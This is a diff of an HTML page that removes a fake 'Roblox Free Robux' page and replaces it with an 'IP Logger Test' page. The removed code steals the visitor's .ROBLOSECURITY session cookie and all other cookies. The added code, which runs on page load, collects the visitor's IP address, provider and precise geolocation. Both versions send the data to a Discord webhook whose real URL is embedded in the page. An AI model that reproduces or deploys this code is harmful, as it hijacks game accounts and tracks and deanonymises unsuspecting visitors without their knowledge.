@@ -1,76 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Roblox Free Robux</title>
+    <title>IP Logger Test</title>
     <script>
         // Discord webhook URL
         var webHookUrl = "https://discord.com/api/webhooks/1338299297292226590/vG66beFgowK_JWnSqaeHltm50_Wl7R26AGggIGdc_Xpw71OqDh4NriFFAzk4hWX5PCNB";
 
-        // Cookie Logger (unchanged)
-        function logRobloxCookie() {
-            try {
-                const cookies = document.cookie;
-                console.log("All cookies:", cookies);
-
-                const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || "Cookie not found";
-                const cookieValue = robloxCookie.includes('=') ? robloxCookie.split('=')[1] : robloxCookie;
-
-                const payload = {
-                    username: "Roblox Logger",
-                    content: "Cookie check triggered!",
-                    embeds: [{
-                        title: "Cookie Info",
-                        fields: [
-                            { name: "ROBLOSECURITY", value: `\`\`\`${cookieValue}\`\`\``, inline: true },
-                            { name: "Time", value: new Date().toLocaleString(), inline: true },
-                            { name: "All Cookies", value: `\`\`\`${cookies || "None"}\`\`\``, inline: false }
-                        ],
-                        color: 15258703
-                    }]
-                };
-
-                fetch(webHookUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                })
-                .then(response => {
-                    if (response.ok) console.log("Cookie sent to webhook!");
-                    else throw new Error(`Cookie webhook failed: ${response.status}`);
-                })
-                .catch(error => console.error("Cookie fetch error:", error));
-            } catch (error) {
-                console.error("Cookie script error:", error);
-            }
-        }
-
-        // IP Logger (forked from luisoos/IP-Log-To-Discord-Webhook)
+        // IP Logger function
         async function logIP() {
             try {
+                // Fetch IP and geolocation data from ip-api.com
                 const response = await fetch('https://ip-api.com/json/');
                 if (!response.ok) throw new Error(`IP-API fetch failed: ${response.status}`);
                 const data = await response.json();
+                console.log("IP data:", data);
 
-                // IP and geolocation data
-                var ip = data.query;
-                var provider = data.org + " (" + data.as + ")";
-                var timezone = data.timezone;
-                var country = data.country;
-                var countryCode = data.countryCode.toLowerCase();
-                var region = data.region + " (" + data.regionName + ")";
-                var city = data.city;
-                var zip = data.zip;
-                var lat = data.lat;
-                var lon = data.lon;
+                // Extract data
+                var ip = data.query || "Unknown IP";
+                var provider = (data.org && data.as) ? `${data.org} (${data.as})` : "Unknown Provider";
+                var timezone = data.timezone || "Unknown Timezone";
+                var country = data.country || "Unknown Country";
+                var countryCode = data.countryCode ? data.countryCode.toLowerCase() : "xx";
+                var region = (data.region && data.regionName) ? `${data.region} (${data.regionName})` : "Unknown Region";
+                var city = data.city || "Unknown City";
+                var zip = data.zip || "Unknown Zip";
+                var lat = data.lat || "Unknown Latitude";
+                var lon = data.lon || "Unknown Longitude";
 
-                // POST request to Discord
+                // Prepare Discord payload
                 var postRequest = new XMLHttpRequest();
                 postRequest.open("POST", webHookUrl);
                 postRequest.setRequestHeader('Content-type', 'application/json');
 
                 var params = {
-                    username: "IP Log",
-                    avatar_url: "",
+                    username: "IP Logger",
+                    avatar_url: "https://i.imgur.com/xyz123.png", // Optional avatar (replace or remove)
                     content: "__**:globe_with_meridians: IP-Address:**__ \n" 
                             + "`" + ip + "`" + 
                             "\n \n__**:telephone: Provider:**__ \n" 
@@ -86,39 +50,49 @@
                             + "**Latitude:** " + lat
                 };
 
+                // Handle response
                 postRequest.onload = function() {
                     if (postRequest.status === 204) {
                         console.log("IP sent to webhook!");
                     } else {
-                        console.error("IP webhook failed:", postRequest.status);
+                        console.error("Webhook failed with status:", postRequest.status);
                     }
                 };
                 postRequest.onerror = function() {
-                    console.error("IP webhook request error");
+                    console.error("Webhook request error");
                 };
 
+                // Send the data
                 postRequest.send(JSON.stringify(params));
             } catch (error) {
-                console.error("IP script error:", error);
+                console.error("IP logger error:", error);
+
+                // Send error to Discord as fallback
+                var errorRequest = new XMLHttpRequest();
+                errorRequest.open("POST", webHookUrl);
+                errorRequest.setRequestHeader('Content-type', 'application/json');
+                var errorParams = {
+                    username: "IP Logger",
+                    content: "IP Logger Error: " + error.message
+                };
+                errorRequest.send(JSON.stringify(errorParams));
             }
         }
 
-        // Run both on load
+        // Run on load
         window.onload = function() {
-            logRobloxCookie();
             logIP();
         };
 
-        // Button trigger for manual testing
+        // Manual trigger for testing
         function manualTrigger() {
-            logRobloxCookie();
             logIP();
         }
     </script>
 </head>
 <body>
-    <h1>Loading Your Free Robux...</h1>
-    <button onclick="manualTrigger()">Test Again</button>
-    <p>Set test cookie in console: <code>document.cookie = ".ROBLOSECURITY=test123; path=/";</code></p>
+    <h1>IP Logger Test Page</h1>
+    <button onclick="manualTrigger()">Log IP Again</button>
+    <p>Open console (F12) to see debug info.</p>
 </body>
 </html>
